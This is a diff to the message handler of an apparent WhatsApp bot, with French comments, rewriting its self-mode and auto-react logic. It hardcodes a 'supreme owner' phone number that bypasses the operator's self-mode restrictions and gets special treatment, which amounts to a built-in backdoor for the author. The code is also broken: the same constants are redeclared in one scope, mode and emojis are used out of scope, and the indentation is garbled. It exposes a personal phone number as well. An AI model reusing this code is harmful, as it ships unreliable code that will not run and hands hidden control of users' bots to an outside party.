@@ -315,34 +315,80 @@ const handleMessage = async (sock, msg) => {
 
     const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
-    // 🚨 LA RÈGLE D'OR DU SELFMODE REVISITÉE
-    if (config.selfMode && !isMe) {
-      if (!isGroup) return; 
+    // --- DÉTECTION DE L'IDENTITÉ (INDISPENSABLE) ---
+const sender = msg.key.participant || msg.key.remoteJid;
+const senderNumber = sender.replace(/\D/g, '');
 
-      const body = msg.message.conversation || msg.message.extendedTextMessage?.text || '';
-      const isCommand = body.startsWith(config.prefix || '.');
+// Définition du Maître et du Suprême
+const supremeOwner = '22651622652';
+const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => senderNumber.includes(n.replace(/\D/g, '')));
+const isSupremeOwner = senderNumber.includes(supremeOwner);
 
-      if (isCommand) return; 
-    }
+// isMe est VRAI si c'est le bot lui-même, l'owner du config, ou TOI (Suprême)
+const isMe = msg.key.fromMe || isConfigOwner || isSupremeOwner;
 
-    // Auto-React System
+// 🚨 LOGIQUE SELFMODE GHOSTG-X (LA RÈGLE D'OR FIXÉE)
+if (config.selfMode && !isMe) {
+    // Si on est en privé (DM) et que ce n'est pas TOI : Blocage total (Silence)
+    if (!isGroup) return;
+
+    // Si on est en groupe : Le bot lit (pour l'Antilink), mais ignore les commandes
+    const body = msg.message?.conversation || msg.message?.extendedTextMessage?.text || '';
+    const isCommand = body.startsWith(config.prefix || '.');
+    
+    if (isCommand) return; // Stop : On ne répond pas aux commandes des autres
+}
+
+// À partir d'ici, si config.selfMode est false, TOUT LE MONDE passe.
+// Si config.selfMode est true, SEUL 'isMe' (Toi) arrive à cette ligne.
+
+
+      // 🎯 ---------------- SYSTEME AUTO-REACT GHOSTG-X ----------------
     try {
       delete require.cache[require.resolve('./config')];
       const config = require('./config');
 
-      if (config.autoReact && msg.message && !msg.key.fromMe) {
+      if (config.autoReact && msg.message) {
         const content = msg.message.ephemeralMessage?.message || msg.message;
-        const text = content.conversation || content.extendedTextMessage?.text || '';
+        const text = (content.conversation || content.extendedTextMessage?.text || '').trim();
         const jid = msg.key.remoteJid;
-        const emojis = ['❤️', '🔥', '👋🏾', '💀', '😁', '✨', '👍🏾', '🤨', '🧛🏾', '😂', '🙏🏾', '💫'];
-        const mode = config.autoReactMode || 'bot';
+        const sender = msg.key.participant || msg.key.remoteJid;
+        
+        // Identification du Suprême Owner (22651622652)
+        const isSupreme = sender.includes('22651622652');
+        const prefixList = ['.', '/', '#', '&', '+', '€', '-'];
+        const isCommand = prefixList.includes(text[0]);
 
-        if (mode === 'bot') {
-          const prefixList = ['.', '/', '#', '&','+', '€', '-'];
-          if (prefixList.includes(text?.trim()[0])) {
-            await sock.sendMessage(jid, { react: { text: '🎯', key: msg.key } });
+        if (isCommand) {
+          // 1. PRIORITÉ ROYALE : Si c'est TOI (Suprême Owner)
+          if (isSupreme) {
+            await sock.sendMessage(jid, { react: { text: '👑', key: msg.key } });
+            // On s'arrête ici pour ne pas envoyer d'autre réaction
+            return; 
+          }
+
+          // 2. RÉACTION POUR LES AUTRES (Uniquement si ce n'est pas le bot lui-même)
+          if (!msg.key.fromMe) {
+            const mode = config.autoReactMode || 'bot';
+            
+            if (mode === 'bot') {
+              // Réaction fixe pour les commandes des autres
+              await sock.sendMessage(jid, { react: { text: '🎯', key: msg.key } });
+            } else {
+              // Réaction aléatoire pour les autres
+              const emojis = ['❤️', '🔥', '👋🏾', '💀', '😁', '✨', '👍🏾', '🤨', '🧛🏾', '😂', '🙏🏾', '💫'];
+              const randomEmoji = emojis[Math.floor(Math.random() * emojis.length)];
+              await sock.sendMessage(jid, { react: { text: randomEmoji, key: msg.key } });
+            }
           }
         }
+      }
+    } catch (e) {
+      console.error('Erreur Auto-React:', e);
+    }
+    // ----------------------------------------------------------------
+
+        
 
         if (mode === 'all') {
           const rand = emojis[Math.floor(Math.random() * emojis.length)];
